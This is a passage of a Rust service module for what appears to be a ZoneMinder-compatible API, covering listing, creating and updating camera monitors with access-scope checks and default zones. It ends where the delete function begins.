#![allow(clippy::result_large_err)]
use crate::dto::request::{
    AlarmControlRequest, CreateMonitorRequest, MonitorStateRequest, UpdateMonitorRequest,
};
use crate::dto::response::MonitorResponse;
use crate::dto::{PaginatedResponse, PaginationParams};
use crate::entity::{monitors, zones};
use crate::error::{AppError, AppResult, Resource, ResourceType};
use crate::repo;
use crate::server::state::AppState;
use crate::service::monitor_acl::MonitorScope;
use crate::util::authz::Level;
use rust_decimal::prelude::*;
use sea_orm::ActiveValue::{NotSet, Set};
use sea_orm::{ActiveModelTrait, ColumnTrait, EntityTrait, QueryFilter, TransactionTrait};
use tracing::info;

fn monitor_not_found(id: u32) -> AppError {
    AppError::NotFoundError(Resource {
        details: vec![("id".to_string(), id.to_string())],
        resource_type: ResourceType::Monitor,
    })
}

/// Reject access to a monitor outside the caller's row-level ACL scope.
///
/// Returns `NotFoundError` (404) rather than 403 so monitors the caller may
/// not see are not revealed to exist.
fn ensure_visible(scope: &MonitorScope, id: u32, required: Level) -> AppResult<()> {
    if scope.allows(id, required) {
        Ok(())
    } else {
        Err(monitor_not_found(id))
    }
}

pub async fn list_all(state: &AppState, scope: &MonitorScope) -> AppResult<Vec<MonitorResponse>> {
    tracing::debug!("Listing all monitors.");
    let filter = scope.visible_ids(Level::View);
    let monitors = repo::monitors::find_all(state.db(), filter.as_deref()).await?;
    Ok(monitors
        .into_iter()
        .map(|m| MonitorResponse::from(m).for_scope(scope))
        .collect())
}

pub async fn list_paginated(
    state: &AppState,
    params: &PaginationParams,
    include_deleted: bool,
    scope: &MonitorScope,
) -> AppResult<PaginatedResponse<MonitorResponse>> {
    tracing::debug!("Listing monitors with pagination.");
    let filter = scope.visible_ids(Level::View);
    let (items, total) =
        repo::monitors::find_paginated(state.db(), params, filter.as_deref(), include_deleted)
            .await?;
    let responses: Vec<MonitorResponse> = items
        .into_iter()
        .map(|m| MonitorResponse::from(m).for_scope(scope))
        .collect();
    Ok(PaginatedResponse::from_params(responses, total, params))
}

pub async fn get_by_id(
    state: &AppState,
    id: u32,
    scope: &MonitorScope,
) -> AppResult<MonitorResponse> {
    tracing::debug!("Getting monitor by ID: {id}.");
    ensure_visible(scope, id, Level::View)?;
    let monitor = repo::monitors::find_by_id(state.db(), id)
        .await?
        .ok_or_else(|| monitor_not_found(id))?;
    Ok(MonitorResponse::from(monitor).for_scope(scope))
}

/// The "All" zone ZoneMinder gives every new monitor: the whole picture,
/// with the thresholds of ZoneMinder's "Default" zone preset. Since 1.39.3
/// thresholds are a percentage of the zone, so this suits any resolution
/// and orientation.
fn default_zone(monitor_id: u32) -> zones::ActiveModel {
    use crate::entity::sea_orm_active_enums::{CheckMethod, Units, ZoneType};
    let pct = |v: i64, scale: u32| Some(Decimal::new(v, scale));
    zones::ActiveModel {
        monitor_id: Set(monitor_id),
        name: Set("All".to_string()),
        r#type: Set(ZoneType::Active),
        units: Set(Units::Percent),
        num_coords: Set(4),
        coords: Set("0.00,0.00 100.00,0.00 100.00,100.00 0.00,100.00".to_string()),
        area: Set(10000),
        check_method: Set(CheckMethod::Blobs),
        min_pixel_threshold: Set(Some(25)),
        min_alarm_pixels: Set(pct(5, 1)),
        max_alarm_pixels: Set(pct(75, 0)),
        filter_x: Set(Some(3)),
        filter_y: Set(Some(3)),
        min_filter_pixels: Set(pct(35, 2)),
        max_filter_pixels: Set(pct(75, 0)),
        min_blob_pixels: Set(pct(3, 1)),
        min_blobs: Set(Some(1)),
        ..Default::default()
    }
}

/// Turn the monitor's zones with its picture when Orientation changes.
/// See [`crate::service::zone_orientation`].
async fn reorient_zones<C: sea_orm::ConnectionTrait>(
    conn: &C,
    before: &monitors::Model,
    after: &monitors::Model,
) -> AppResult<()> {
    if before.orientation == after.orientation {
        return Ok(());
    }
    let zs = zones::Entity::find()
        .filter(zones::Column::MonitorId.eq(after.id))
        .all(conn)
        .await?;
    for z in zs {
        let Some(coords) = crate::service::zone_orientation::reorient(
            &z.coords,
            &before.orientation,
            &after.orientation,
            after.width,
            after.height,
        ) else {
            continue;
        };
        let mut am: zones::ActiveModel = z.into();
        am.coords = Set(coords);
        am.update(conn).await?;
    }
    Ok(())
}

/// The monitor ids a `LinkedMonitors` expression names, or why zmc couldn't
/// read it. zmc splits the value on `| & ( ) ,` and reads each piece as
/// `<monitor id>` or `<monitor id>:<zone id>`.
pub fn linked_monitor_ids(expr: &str) -> Result<Vec<u32>, String> {
    let id = |digits: &str| -> Option<u32> {
        if digits.is_empty() || !digits.bytes().all(|b| b.is_ascii_digit()) {
            return None;
        }
        digits.parse().ok()
    };
    let mut ids = Vec::new();
    for token in expr.split(['|', '&', '(', ')', ',']) {
        let token = token.trim();
        if token.is_empty() {
            continue;
        }
        let (monitor, zone) = match token.split_once(':') {
            Some((m, z)) => (m, Some(z)),
            None => (token, None),
        };
        let monitor_id = id(monitor);
        if monitor_id.is_none() || zone.is_some_and(|z| id(z).is_none()) {
            return Err(format!(
                "linked_monitors: '{token}' is not a monitor id or monitor id:zone id"
            ));
        }
        ids.extend(monitor_id);
    }
    Ok(ids)
}

/// `linked_monitors` must parse, and name only monitors the caller can see.
/// A hidden monitor gets the same answer as one that doesn't exist.
fn check_linked_monitors(expr: Option<&str>, scope: &MonitorScope) -> AppResult<()> {
    let Some(expr) = expr else {
        return Ok(());
    };
    let ids = linked_monitor_ids(expr).map_err(AppError::BadRequestError)?;
    if let Some(id) = ids.into_iter().find(|&id| !scope.allows(id, Level::View)) {
        return Err(AppError::BadRequestError(format!(
            "linked_monitors: monitor {id} not found"
        )));
    }
    Ok(())
}

pub async fn create(state: &AppState, req: CreateMonitorRequest) -> AppResult<MonitorResponse> {
    // Name only: the request carries camera RTSP/ONVIF credentials.
    info!("Creating new monitor: {}.", req.name);
    // Creating needs unrestricted access, so every monitor is visible.
    check_linked_monitors(req.linked_monitors.as_deref(), &MonitorScope::All)?;

    // Convert string values to their corresponding enum types
    let monitor_type = req.r#type.clone();
    let function = req.function.clone();
    let capturing = req.capturing.clone();
    let decoding = req.decoding.clone();
    let rtsp2_web_type = req.rtsp2_web_type.clone();
    let orientation = req.orientation.clone();
    let recording_source = req.recording_source.clone();
    let default_codec = req.default_codec.clone();
    let importance = req.importance.clone();
    let analysing = req.analysing.clone();
    let analysis_source = req.analysis_source.clone();
    let analysis_image = req.analysis_image.clone();
    let recording = req.recording.clone();

    // Create a new ActiveModel for the monitor
    let monitor = monitors::ActiveModel {
        id: Set(0), // This will be auto-generated
        name: Set(req.name),
        deleted: req.deleted.map_or(NotSet, |v| Set(v as i8)),
        notes: Set(req.notes),
        server_id: Set(req.server_id),
        storage_id: req.storage_id.map_or(NotSet, |v| Set(Some(v))),
        manufacturer_id: Set(req.manufacturer_id),
        model_id: Set(req.model_id),
        r#type: Set(monitor_type),
        function: function.map_or(NotSet, Set),
        capturing: capturing.map_or(NotSet, Set),
        enabled: req.enabled.map(Set).unwrap_or(NotSet),
        decoding_enabled: req.decoding_enabled.map_or(NotSet, Set),
        decoding: decoding.map_or(NotSet, Set),
        rtsp2_web_enabled: req.rtsp2_web_enabled.map_or(NotSet, Set),
        rtsp2_web_type: rtsp2_web_type.map_or(NotSet, Set),
        janus_enabled: req.janus_enabled.map_or(NotSet, Set),
        janus_audio_enabled: req.janus_audio_enabled.map_or(NotSet, Set),
        janus_profile_override: Set(req.janus_profile_override.unwrap_or_default()),
        restream: req.restream.map_or(NotSet, Set),
        rtsp_user: Set(req.rtsp_user),
        janus_rtsp_session_timeout: Set(req.janus_rtsp_session_timeout.unwrap_or(0)),
        linked_monitors: Set(req.linked_monitors),
        triggers: req.triggers.map_or(NotSet, Set),
        event_start_command: req.event_start_command.map_or(NotSet, Set),
        event_end_command: req.event_end_command.map_or(NotSet, Set),
        onvif_url: req.onvif_url.map_or(NotSet, Set),
        onvif_events_path: req.onvif_events_path.map_or(NotSet, Set),
        onvif_username: req.onvif_username.map_or(NotSet, Set),
        onvif_password: req.onvif_password.map_or(NotSet, Set),
        onvif_options: req.onvif_options.map_or(NotSet, Set),
        onvif_event_listener: req.onvif_event_listener.map_or(NotSet, Set),
        onvif_alarm_text: Set(req.onvif_alarm_text),
        use_amcrest_api: req.use_amcrest_api.map_or(NotSet, Set),
        device: req.device.map_or(NotSet, Set),
        channel: req.channel.map_or(NotSet, Set),
        format: req.format.map_or(NotSet, Set),
        v4l_multi_buffer: Set(req.v4l_multi_buffer),
        v4l_captures_per_frame: Set(req.v4l_captures_per_frame),
        protocol: Set(req.protocol),
        method: Set(req.method),
        host: Set(req.host),
        port: req.port.map_or(NotSet, Set),
        sub_path: req.sub_path.map_or(NotSet, Set),
        path: Set(req.path),
        second_path: Set(req.second_path),
        options: Set(req.options),
        user: Set(req.user),
        pass: Set(req.pass),
        width: req.width.map_or(NotSet, Set),
        height: req.height.map_or(NotSet, Set),
        colours: req.colours.map_or(NotSet, Set),
        palette: req.palette.map_or(NotSet, Set),
        orientation: orientation.map_or(NotSet, Set),
        deinterlacing: req.deinterlacing.map_or(NotSet, Set),
        decoder: Set(req.decoder),
        decoder_hw_accel_name: Set(req.decoder_hw_accel_name),
        decoder_hw_accel_device: Set(req.decoder_hw_accel_device),
        save_jpe_gs: req.save_jpe_gs.map_or(NotSet, Set),
        video_writer: req.video_writer.map_or(NotSet, Set),
        output_codec: Set(req.output_codec.unwrap_or(0)),
        encoder: Set(req.encoder),
        output_container: Set(req.output_container),
        encoder_parameters: Set(req.encoder_parameters),
        record_audio: req.record_audio.map_or(NotSet, Set),
        recording_source: recording_source.map_or(NotSet, Set),
        brightness: req.brightness.map_or(NotSet, |v| Set(Some(v))),
        contrast: req.contrast.map_or(NotSet, |v| Set(Some(v))),
        hue: req.hue.map_or(NotSet, |v| Set(Some(v))),
        colour: req.colour.map_or(NotSet, |v| Set(Some(v))),
        event_prefix: req.event_prefix.map_or(NotSet, Set),
        label_format: Set(req.label_format),
        label_x: req.label_x.map_or(NotSet, Set),
        label_y: req.label_y.map_or(NotSet, Set),
        label_size: req.label_size.map_or(NotSet, Set),
        image_buffer_count: req.image_buffer_count.map_or(NotSet, Set),
        max_image_buffer_count: req.max_image_buffer_count.map_or(NotSet, Set),
        warmup_count: req.warmup_count.map_or(NotSet, Set),
        pre_event_count: req.pre_event_count.map_or(NotSet, Set),
        post_event_count: req.post_event_count.map_or(NotSet, Set),
        stream_replay_buffer: req.stream_replay_buffer.map_or(NotSet, Set),
        alarm_frame_count: req.alarm_frame_count.map_or(NotSet, Set),
        section_length: req.section_length.map_or(NotSet, Set),
        section_length_warn: req.section_length_warn.map_or(NotSet, Set),
        event_close_mode: req.event_close_mode.map_or(NotSet, Set),
        min_section_length: req.min_section_length.map_or(NotSet, Set),
        motion_frame_skip: req.motion_frame_skip.map_or(NotSet, Set),
        device_class: req.device_class.clone().map(Set).unwrap_or(NotSet),
        audio_detection: req.audio_detection.map(Set).unwrap_or(NotSet),
        audio_threshold: req.audio_threshold.map(Set).unwrap_or(NotSet),
        audio_alarm_score: req.audio_alarm_score.map(Set).unwrap_or(NotSet),
        analysis_fps_limit: Set(req
            .analysis_fps_limit
            .map(|f| Decimal::from_f64(f).unwrap_or_default())),
        analysis_update_delay: req.analysis_update_delay.map_or(NotSet, Set),
        max_fps: Set(req
            .max_fps
            .map(|f| Decimal::from_f64(f).unwrap_or_default())),
        alarm_max_fps: Set(req
            .alarm_max_fps
            .map(|f| Decimal::from_f64(f).unwrap_or_default())),
        fps_report_interval: req.fps_report_interval.map_or(NotSet, Set),
        ref_blend_perc: req.ref_blend_perc.map_or(NotSet, Set),
        alarm_ref_blend_perc: req.alarm_ref_blend_perc.map_or(NotSet, Set),
        controllable: req.controllable.map_or(NotSet, Set),
        control_id: Set(req.control_id),
        control_device: Set(req.control_device),
        control_address: Set(req.control_address),
        auto_stop_timeout: Set(req
            .auto_stop_timeout
            .map(|f| Decimal::from_f64(f).unwrap_or_default())),
        track_motion: req.track_motion.map_or(NotSet, Set),
        track_delay: Set(req.track_delay),
        return_location: req.return_location.map_or(NotSet, Set),
        return_delay: Set(req.return_delay),
        modect_during_ptz: req.modect_during_ptz.map_or(NotSet, Set),
        default_rate: req.default_rate.map_or(NotSet, Set),
        default_scale: req.default_scale.map_or(NotSet, Set),
        default_codec: default_codec.map_or(NotSet, Set),
        signal_check_points: req.signal_check_points.map_or(NotSet, Set),
        signal_check_colour: req.signal_check_colour.map_or(NotSet, Set),
        web_colour: req.web_colour.map_or(NotSet, Set),
        exif: req.exif.map_or(NotSet, Set),
        sequence: Set(req.sequence),
        zone_count: req.zone_count.map_or(NotSet, Set),
        refresh: Set(req.refresh),
        latitude: Set(req
            .latitude
            .map(|f| Decimal::from_f64(f).unwrap_or_default())),
        longitude: Set(req
            .longitude
            .map(|f| Decimal::from_f64(f).unwrap_or_default())),
        rtsp_server: req.rtsp_server.map_or(NotSet, Set),
        rtsp_stream_name: req.rtsp_stream_name.map_or(NotSet, Set),
        soap_wsa_compl: req.soap_wsa_compl.map_or(NotSet, Set),
        importance: importance.map_or(NotSet, Set),
        mqtt_enabled: req.mqtt_enabled.map_or(NotSet, Set),
        mqtt_subscriptions: req.mqtt_subscriptions.map_or(NotSet, |v| Set(Some(v))),
        startup_delay: req.startup_delay.map_or(NotSet, Set),
        analysing: analysing.map_or(NotSet, Set),
        analysis_source: analysis_source.map_or(NotSet, Set),
        analysis_image: analysis_image.map_or(NotSet, Set),
        analysis_image_opacity: req.analysis_image_opacity.map_or(NotSet, Set),
        object_detection: req.object_detection.map_or(NotSet, Set),
        object_detection_model: req.object_detection_model.map_or(NotSet, Set),
        object_detection_object_threshold: req
            .object_detection_object_threshold
            .map_or(NotSet, Set),
        object_detection_nms_threshold: req.object_detection_nms_threshold.map_or(NotSet, Set),
        what_display: req.what_display.map_or(NotSet, Set),
        recording: recording.map_or(NotSet, Set),
        default_player: req.default_player.map_or(NotSet, |v| Set(Some(v))),
        stream_channel: req.stream_channel.map_or(NotSet, Set),
        go2_rtc_enabled: req.go2rtc_enabled.map_or(NotSet, Set),
        // Not on the request DTO; the DB default applies.
        output_codec_name: NotSet,
        encoder_hw_accel_name: req.encoder_hw_accel_name.map_or(NotSet, |v| Set(Some(v))),
        encoder_hw_accel_device: req.encoder_hw_accel_device.map_or(NotSet, |v| Set(Some(v))),
        wall_clock_timestamps: req.wall_clock_timestamps.map_or(NotSet, Set),
    };

    // The monitor and its full-frame zone go in together, as ZoneMinder's
    // monitor editor adds them: without a zone, Modect never alarms.
    let txn = state.db().begin().await?;
    let result = repo::monitors::create(&txn, monitor).await?;
    default_zone(result.id).insert(&txn).await?;
    txn.commit().await?;
    crate::service::monitor_daemons::created(state, &result).await;

    Ok(MonitorResponse::from(result))
}

/// `EventStartCommand`/`EventEndCommand` are run by `zmc` (through `/bin/sh -c`
/// when they hold a `%` tag), so changing one is shell access on the server.
/// ZoneMinder keeps that to System editors. Sending the
/// current value again is not a change.
pub fn ensure_may_set_event_commands(
    perms: &crate::util::authz::UserPermissions,
    requested: [Option<&str>; 2],
    current: [&str; 2],
) -> AppResult<()> {
    if perms.system >= Level::Edit {
        return Ok(());
    }
    let changed = requested
        .iter()
        .zip(current)
        .any(|(req, cur)| req.is_some_and(|r| r != cur));
    if changed {
        return Err(AppError::PermissionDeniedError(
            "changing a monitor's event commands needs System Edit".to_string(),
        ));
    }
    Ok(())
}

pub async fn update(
    state: &AppState,
    id: u32,
    req: UpdateMonitorRequest,
    scope: &MonitorScope,
    perms: &crate::util::authz::UserPermissions,
) -> AppResult<MonitorResponse> {
    // Id only: the request carries camera RTSP/ONVIF credentials.
    info!("Updating monitor with ID: {id}.");
    ensure_visible(scope, id, Level::Edit)?;
    check_linked_monitors(req.linked_monitors.as_deref(), scope)?;

    // Fetch the monitor through the repository
    let monitor_model = repo::monitors::find_by_id(state.db(), id)
        .await?
        .ok_or_else(|| {
            AppError::NotFoundError(Resource {
                details: vec![("id".to_string(), id.to_string())],
                resource_type: ResourceType::File,
            })
        })?;
    ensure_may_set_event_commands(
        perms,
        [
            req.event_start_command.as_deref(),
            req.event_end_command.as_deref(),
        ],
        [
            &monitor_model.event_start_command,
            &monitor_model.event_end_command,
        ],
    )?;

    // The row as it was, to stop its daemons with after the save.
    let before = monitor_model.clone();
    let mut monitor: monitors::ActiveModel = monitor_model.into();

    // Update fields if they are provided in the request
    if let Some(name) = req.name {
        monitor.name = Set(name);
    }
    if let Some(deleted) = req.deleted {
        monitor.deleted = Set(deleted as i8);
    }
    if let Some(enabled) = req.enabled {
        monitor.enabled = Set(enabled);
    }
    if let Some(v) = req.go2rtc_enabled {
        monitor.go2_rtc_enabled = Set(v);
    }
    if let Some(v) = req.wall_clock_timestamps {
        monitor.wall_clock_timestamps = Set(v);
    }
    if let Some(v) = req.default_player {
        monitor.default_player = Set(Some(v));
    }
    if let Some(v) = req.encoder_hw_accel_name {
        monitor.encoder_hw_accel_name = Set(Some(v));
    }
    if let Some(v) = req.encoder_hw_accel_device {
        monitor.encoder_hw_accel_device = Set(Some(v));
    }
    if let Some(v) = req.stream_channel {
        monitor.stream_channel = Set(v);
    }
    if let Some(v) = req.what_display {
        monitor.what_display = Set(v);
    }
    if let Some(v) = req.analysis_image_opacity {
        monitor.analysis_image_opacity = Set(v);
    }
    if let Some(v) = req.object_detection {
        monitor.object_detection = Set(v);
    }
    if let Some(v) = req.object_detection_model {
        monitor.object_detection_model = Set(v);
    }
    if let Some(v) = req.object_detection_object_threshold {
        monitor.object_detection_object_threshold = Set(v);
    }
    if let Some(v) = req.object_detection_nms_threshold {
        monitor.object_detection_nms_threshold = Set(v);
    }
    if req.notes.is_some() {
        monitor.notes = Set(req.notes);
    }
    if req.server_id.is_some() {
        monitor.server_id = Set(req.server_id);
    }
    if let Some(storage_id) = req.storage_id {
        monitor.storage_id = Set(Some(storage_id));
    }
    if req.manufacturer_id.is_some() {
        monitor.manufacturer_id = Set(req.manufacturer_id);
    }
    if req.model_id.is_some() {
        monitor.model_id = Set(req.model_id);
    }
    if let Some(monitor_type) = req.r#type {
        monitor.r#type = Set(monitor_type);
    }
    if let Some(function) = req.function {
        monitor.function = Set(function);
    }
    if let Some(capturing) = req.capturing {
        monitor.capturing = Set(capturing);
    }
    if let Some(decoding_enabled) = req.decoding_enabled {
        monitor.decoding_enabled = Set(decoding_enabled);
    }
    if let Some(decoding) = req.decoding {
        monitor.decoding = Set(decoding);
    }
    if let Some(rtsp2_web_enabled) = req.rtsp2_web_enabled {
        monitor.rtsp2_web_enabled = Set(rtsp2_web_enabled);
    }
    if let Some(rtsp2_web_type) = req.rtsp2_web_type {
        monitor.rtsp2_web_type = Set(rtsp2_web_type);
    }
    if let Some(janus_enabled) = req.janus_enabled {
        monitor.janus_enabled = Set(janus_enabled);
    }
    if let Some(janus_audio_enabled) = req.janus_audio_enabled {
        monitor.janus_audio_enabled = Set(janus_audio_enabled);
    }
    if let Some(janus_profile_override) = req.janus_profile_override {
        monitor.janus_profile_override = Set(janus_profile_override);
    }
    if let Some(restream) = req.restream {
        monitor.restream = Set(restream);
    }
    if req.rtsp_user.is_some() {
        monitor.rtsp_user = Set(req.rtsp_user);
    }
    if let Some(janus_rtsp_session_timeout) = req.janus_rtsp_session_timeout {
        monitor.janus_rtsp_session_timeout = Set(janus_rtsp_session_timeout);
    }
    if req.linked_monitors.is_some() {
        monitor.linked_monitors = Set(req.linked_monitors);
    }
    if let Some(triggers) = req.triggers {
        monitor.triggers = Set(triggers);
    }
    if let Some(event_start_command) = req.event_start_command {
        monitor.event_start_command = Set(event_start_command);
    }
    if let Some(event_end_command) = req.event_end_command {
        monitor.event_end_command = Set(event_end_command);
    }
    if let Some(onvif_url) = req.onvif_url {
        monitor.onvif_url = Set(onvif_url);
    }
    if let Some(onvif_events_path) = req.onvif_events_path {
        monitor.onvif_events_path = Set(onvif_events_path);
    }
    if let Some(onvif_username) = req.onvif_username {
        monitor.onvif_username = Set(onvif_username);
    }
    if let Some(onvif_password) = req.onvif_password {
        monitor.onvif_password = Set(onvif_password);
    }
    if let Some(onvif_options) = req.onvif_options {
        monitor.onvif_options = Set(onvif_options);
    }
    if let Some(onvif_event_listener) = req.onvif_event_listener {
        monitor.onvif_event_listener = Set(onvif_event_listener);
    }
    if req.onvif_alarm_text.is_some() {
        monitor.onvif_alarm_text = Set(req.onvif_alarm_text);
    }
    if let Some(use_amcrest_api) = req.use_amcrest_api {
        monitor.use_amcrest_api = Set(use_amcrest_api);
    }
    if let Some(device) = req.device {
        monitor.device = Set(device);
    }
    if let Some(channel) = req.channel {
        monitor.channel = Set(channel);
    }
    if let Some(format) = req.format {
        monitor.format = Set(format);
    }
    if req.v4l_multi_buffer.is_some() {
        monitor.v4l_multi_buffer = Set(req.v4l_multi_buffer);
    }
    if req.v4l_captures_per_frame.is_some() {
        monitor.v4l_captures_per_frame = Set(req.v4l_captures_per_frame);
    }
    if req.protocol.is_some() {
        monitor.protocol = Set(req.protocol);
    }
    if req.method.is_some() {
        monitor.method = Set(req.method);
    }
    if req.host.is_some() {
        monitor.host = Set(req.host);
    }
    if let Some(port) = req.port {
        monitor.port = Set(port);
    }
    if let Some(sub_path) = req.sub_path {
        monitor.sub_path = Set(sub_path);
    }
    if req.path.is_some() {
        monitor.path = Set(req.path);
    }
    if req.second_path.is_some() {
        monitor.second_path = Set(req.second_path);
    }
    if req.options.is_some() {
        monitor.options = Set(req.options);
    }
    if req.user.is_some() {
        monitor.user = Set(req.user);
    }
    if req.pass.is_some() {
        monitor.pass = Set(req.pass);
    }
    if let Some(width) = req.width {
        monitor.width = Set(width);
    }
    if let Some(height) = req.height {
        monitor.height = Set(height);
    }
    if let Some(colours) = req.colours {
        monitor.colours = Set(colours);
    }
    if let Some(palette) = req.palette {
        monitor.palette = Set(palette);
    }
    if let Some(orientation) = req.orientation {
        monitor.orientation = Set(orientation);
    }
    if let Some(deinterlacing) = req.deinterlacing {
        monitor.deinterlacing = Set(deinterlacing);
    }
    if req.decoder.is_some() {
        monitor.decoder = Set(req.decoder);
    }
    if req.decoder_hw_accel_name.is_some() {
        monitor.decoder_hw_accel_name = Set(req.decoder_hw_accel_name);
    }
    if req.decoder_hw_accel_device.is_some() {
        monitor.decoder_hw_accel_device = Set(req.decoder_hw_accel_device);
    }
    if let Some(save_jpe_gs) = req.save_jpe_gs {
        monitor.save_jpe_gs = Set(save_jpe_gs);
    }
    if let Some(video_writer) = req.video_writer {
        monitor.video_writer = Set(video_writer);
    }
    if let Some(output_codec) = req.output_codec {
        monitor.output_codec = Set(output_codec);
    }
    if req.encoder.is_some() {
        monitor.encoder = Set(req.encoder);
    }
    if let Some(output_container) = req.output_container {
        monitor.output_container = Set(Some(output_container));
    }
    if req.encoder_parameters.is_some() {
        monitor.encoder_parameters = Set(req.encoder_parameters);
    }
    if let Some(record_audio) = req.record_audio {
        monitor.record_audio = Set(record_audio);
    }
    if let Some(recording_source) = req.recording_source {
        monitor.recording_source = Set(recording_source);
    }
    if let Some(brightness) = req.brightness {
        monitor.brightness = Set(Some(brightness));
    }
    if let Some(contrast) = req.contrast {
        monitor.contrast = Set(Some(contrast));
    }
    if let Some(hue) = req.hue {
        monitor.hue = Set(Some(hue));
    }
    if let Some(colour) = req.colour {
        monitor.colour = Set(Some(colour));
    }
    if let Some(event_prefix) = req.event_prefix {
        monitor.event_prefix = Set(event_prefix);
    }
    if req.label_format.is_some() {
        monitor.label_format = Set(req.label_format);
    }
    if let Some(label_x) = req.label_x {
        monitor.label_x = Set(label_x);
    }
    if let Some(label_y) = req.label_y {
        monitor.label_y = Set(label_y);
    }
    if let Some(label_size) = req.label_size {
        monitor.label_size = Set(label_size);
    }
    if let Some(image_buffer_count) = req.image_buffer_count {
        monitor.image_buffer_count = Set(image_buffer_count);
    }
    if let Some(max_image_buffer_count) = req.max_image_buffer_count {
        monitor.max_image_buffer_count = Set(max_image_buffer_count);
    }
    if let Some(warmup_count) = req.warmup_count {
        monitor.warmup_count = Set(warmup_count);
    }
    if let Some(pre_event_count) = req.pre_event_count {
        monitor.pre_event_count = Set(pre_event_count);
    }
    if let Some(post_event_count) = req.post_event_count {
        monitor.post_event_count = Set(post_event_count);
    }
    if let Some(stream_replay_buffer) = req.stream_replay_buffer {
        monitor.stream_replay_buffer = Set(stream_replay_buffer);
    }
    if let Some(alarm_frame_count) = req.alarm_frame_count {
        monitor.alarm_frame_count = Set(alarm_frame_count);
    }
    if let Some(section_length) = req.section_length {
        monitor.section_length = Set(section_length);
    }
    if let Some(section_length_warn) = req.section_length_warn {
        monitor.section_length_warn = Set(section_length_warn);
    }
    if let Some(event_close_mode) = req.event_close_mode {
        monitor.event_close_mode = Set(event_close_mode);
    }
    if let Some(min_section_length) = req.min_section_length {
        monitor.min_section_length = Set(min_section_length);
    }
    if let Some(motion_frame_skip) = req.motion_frame_skip {
        monitor.motion_frame_skip = Set(motion_frame_skip);
    }
    if let Some(device_class) = req.device_class {
        monitor.device_class = Set(device_class);
    }
    if let Some(audio_detection) = req.audio_detection {
        monitor.audio_detection = Set(audio_detection);
    }
    if let Some(audio_threshold) = req.audio_threshold {
        monitor.audio_threshold = Set(audio_threshold);
    }
    if let Some(audio_alarm_score) = req.audio_alarm_score {
        monitor.audio_alarm_score = Set(audio_alarm_score);
    }
    if let Some(analysis_fps_limit) = req.analysis_fps_limit {
        monitor.analysis_fps_limit = Set(Some(
            Decimal::from_f64(analysis_fps_limit).unwrap_or_default(),
        ));
    }
    if let Some(analysis_update_delay) = req.analysis_update_delay {
        monitor.analysis_update_delay = Set(analysis_update_delay);
    }
    if let Some(max_fps) = req.max_fps {
        monitor.max_fps = Set(Some(Decimal::from_f64(max_fps).unwrap_or_default()));
    }
    if let Some(alarm_max_fps) = req.alarm_max_fps {
        monitor.alarm_max_fps = Set(Some(Decimal::from_f64(alarm_max_fps).unwrap_or_default()));
    }
    if let Some(fps_report_interval) = req.fps_report_interval {
        monitor.fps_report_interval = Set(fps_report_interval);
    }
    if let Some(ref_blend_perc) = req.ref_blend_perc {
        monitor.ref_blend_perc = Set(ref_blend_perc);
    }
    if let Some(alarm_ref_blend_perc) = req.alarm_ref_blend_perc {
        monitor.alarm_ref_blend_perc = Set(alarm_ref_blend_perc);
    }
    if let Some(controllable) = req.controllable {
        monitor.controllable = Set(controllable);
    }
    if req.control_id.is_some() {
        monitor.control_id = Set(req.control_id);
    }
    if req.control_device.is_some() {
        monitor.control_device = Set(req.control_device);
    }
    if req.control_address.is_some() {
        monitor.control_address = Set(req.control_address);
    }
    if let Some(auto_stop_timeout) = req.auto_stop_timeout {
        monitor.auto_stop_timeout = Set(Some(
            Decimal::from_f64(auto_stop_timeout).unwrap_or_default(),
        ));
    }
    if let Some(track_motion) = req.track_motion {
        monitor.track_motion = Set(track_motion);
    }
    if req.track_delay.is_some() {
        monitor.track_delay = Set(req.track_delay);
    }
    if let Some(return_location) = req.return_location {
        monitor.return_location = Set(return_location);
    }
    if req.return_delay.is_some() {
        monitor.return_delay = Set(req.return_delay);
    }
    if let Some(modect_during_ptz) = req.modect_during_ptz {
        monitor.modect_during_ptz = Set(modect_during_ptz);
    }
    if let Some(default_rate) = req.default_rate {
        monitor.default_rate = Set(default_rate);
    }
    if let Some(default_scale) = req.default_scale {
        monitor.default_scale = Set(default_scale);
    }
    if let Some(default_codec) = req.default_codec {
        monitor.default_codec = Set(default_codec);
    }
    if let Some(signal_check_points) = req.signal_check_points {
        monitor.signal_check_points = Set(signal_check_points);
    }
    if let Some(signal_check_colour) = req.signal_check_colour {
        monitor.signal_check_colour = Set(signal_check_colour);
    }
    if let Some(web_colour) = req.web_colour {
        monitor.web_colour = Set(web_colour);
    }
    if let Some(exif) = req.exif {
        monitor.exif = Set(exif);
    }
    if req.sequence.is_some() {
        monitor.sequence = Set(req.sequence);
    }
    if let Some(zone_count) = req.zone_count {
        monitor.zone_count = Set(zone_count);
    }
    if req.refresh.is_some() {
        monitor.refresh = Set(req.refresh);
    }
    if let Some(latitude) = req.latitude {
        monitor.latitude = Set(Some(Decimal::from_f64(latitude).unwrap_or_default()));
    }
    if let Some(longitude) = req.longitude {
        monitor.longitude = Set(Some(Decimal::from_f64(longitude).unwrap_or_default()));
    }
    if let Some(rtsp_server) = req.rtsp_server {
        monitor.rtsp_server = Set(rtsp_server);
    }
    if let Some(rtsp_stream_name) = req.rtsp_stream_name {
        monitor.rtsp_stream_name = Set(rtsp_stream_name);
    }
    if let Some(soap_wsa_compl) = req.soap_wsa_compl {
        monitor.soap_wsa_compl = Set(soap_wsa_compl);
    }
    if let Some(importance) = req.importance {
        monitor.importance = Set(importance);
    }
    if let Some(mqtt_enabled) = req.mqtt_enabled {
        monitor.mqtt_enabled = Set(mqtt_enabled);
    }
    if let Some(mqtt_subscriptions) = req.mqtt_subscriptions {
        monitor.mqtt_subscriptions = Set(Some(mqtt_subscriptions));
    }
    if let Some(startup_delay) = req.startup_delay {
        monitor.startup_delay = Set(startup_delay);
    }
    if let Some(analysing) = req.analysing {
        monitor.analysing = Set(analysing);
    }
    if let Some(analysis_source) = req.analysis_source {
        monitor.analysis_source = Set(analysis_source);
    }
    if let Some(analysis_image) = req.analysis_image {
        monitor.analysis_image = Set(analysis_image);
    }
    if let Some(recording) = req.recording {
        monitor.recording = Set(recording);
    }

    // The monitor and, when it turned, its zones change together.
    let txn = state.db().begin().await?;
    let updated_monitor = repo::monitors::update(&txn, monitor).await?;
    reorient_zones(&txn, &before, &updated_monitor).await?;
    txn.commit().await?;
    crate::service::monitor_daemons::updated(state, &before, &updated_monitor).await;
    Ok(MonitorResponse::from(updated_monitor))
}

pub async fn delete(state: &AppState, id: u32, scope: &MonitorScope) -> AppResult<()> {
    info!("Deleting monitor with ID: {id}.");
